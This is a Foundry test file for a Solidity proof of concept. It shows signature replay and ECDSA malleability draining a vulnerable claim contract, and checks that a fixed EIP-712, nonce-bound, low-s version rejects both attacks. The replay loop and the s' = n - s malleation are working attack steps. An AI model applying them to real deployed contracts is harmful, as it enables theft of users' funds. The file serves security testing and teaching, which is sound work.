// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableClaim, SafeClaim} from "../src/signature/Claim.sol";

/// PoC for signature replay + ecrecover malleability (recurring; permit/bridge/airdrop class).
///   forge test --match-contract SignatureReplay -vvv
///
/// Invariant (SC01): an authorizing signature must be single-use (nonce/domain bound) and
/// canonical (low-s). The vulnerable claim has neither — the same signature drains repeatedly,
/// and a malleated (n-s) signature is a second valid signature for the same message.
///
/// See docs/exploits/signature-replay-malleability.md
contract SignatureReplayTest is Test {
    // secp256k1 group order n
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    address signer;
    uint256 signerPk;
    address recipient = makeAddr("recipient");

    function setUp() public {
        (signer, signerPk) = makeAddrAndKey("signer");
    }

    function _signVuln(address to, uint256 amount) internal view returns (uint8 v, bytes32 r, bytes32 s) {
        bytes32 h = keccak256(abi.encodePacked(to, amount));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", h));
        (v, r, s) = vm.sign(signerPk, ethHash);
    }

    function test_vulnerable_signatureReplayDrains() public {
        VulnerableClaim c = new VulnerableClaim{value: 10 ether}(signer);
        (uint8 v, bytes32 r, bytes32 s) = _signVuln(recipient, 1 ether);

        // The signer authorized ONE 1-ether claim, but no nonce binds it: replay it 5x.
        for (uint256 i = 0; i < 5; i++) {
            c.claim(recipient, 1 ether, v, r, s);
        }
        assertEq(recipient.balance, 5 ether, "same signature replayed to over-withdraw");
    }

    function test_vulnerable_malleableSecondSignature() public {
        VulnerableClaim c = new VulnerableClaim{value: 10 ether}(signer);
        (uint8 v, bytes32 r, bytes32 s) = _signVuln(recipient, 1 ether);

        // Malleate: s' = n - s, v flipped. A *different* (v,r,s) tuple that ecrecovers to the same
        // signer for the same message — so any used[keccak(sig)] dedup is trivially bypassed.
        bytes32 s2 = bytes32(N - uint256(s));
        uint8 v2 = v == 27 ? 28 : 27;

        c.claim(recipient, 1 ether, v, r, s); // original
        c.claim(recipient, 1 ether, v2, r, s2); // malleated twin — also accepted
        assertEq(recipient.balance, 2 ether, "malleated signature accepted as a distinct claim");
    }

    function test_safe_noReplay_andRejectsMalleable() public {
        SafeClaim c = new SafeClaim{value: 10 ether}(signer);

        // Sign the EIP-712 digest for nonce 0.
        bytes32 typeHash = keccak256("Claim(address to,uint256 amount,uint256 nonce)");
        bytes32 structHash = keccak256(abi.encode(typeHash, recipient, uint256(1 ether), uint256(0)));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", c.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);

        // First claim succeeds and consumes nonce 0.
        c.claim(recipient, 1 ether, v, r, s);
        assertEq(recipient.balance, 1 ether, "legit claim paid");

        // Replay of the same signature now fails (nonce advanced -> different digest -> wrong signer).
        vm.expectRevert(bytes("bad sig"));
        c.claim(recipient, 1 ether, v, r, s);

        // The malleated high-s twin is rejected outright.
        bytes32 s2 = bytes32(N - uint256(s));
        uint8 v2 = v == 27 ? 28 : 27;
        vm.expectRevert(bytes("malleable s"));
        c.claim(recipient, 1 ether, v2, r, s2);

        assertEq(recipient.balance, 1 ether, "no over-withdraw");
    }
}
